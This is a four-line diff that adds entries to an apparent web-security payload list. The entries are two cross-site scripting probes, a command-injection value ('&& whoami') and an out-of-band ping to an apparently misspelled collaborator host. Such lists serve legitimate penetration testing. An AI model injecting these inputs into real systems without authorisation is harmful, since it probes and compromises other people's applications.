@@ -1,0 +1,4 @@
+"<img src=x onerror=alert('XSS')>"
+"<svg onload=alert(1)>"
+&& whoami
+ping collab.pinmg
